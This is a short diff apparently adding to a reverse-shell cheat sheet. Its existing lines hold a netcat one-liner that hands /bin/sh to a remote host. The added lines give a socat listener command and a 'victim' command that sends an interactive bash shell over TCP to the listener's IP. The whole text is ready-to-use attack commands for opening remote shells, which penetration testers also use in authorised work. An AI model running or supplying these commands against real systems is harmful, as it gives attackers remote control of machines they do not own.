@@ -17,3 +17,9 @@
 # Netcat
 - nc -e /bin/sh 10.0.0.1 1234
 
+# Socat
+ * Listener:
+ - socat file:`tty`,raw,echo=0 tcp-listen:12345
+ 
+ * Victim:
+ - socat exec:’bash -li’,pty,stderr,setsid,sigint,sane tcp:IP_LISTENER:12345
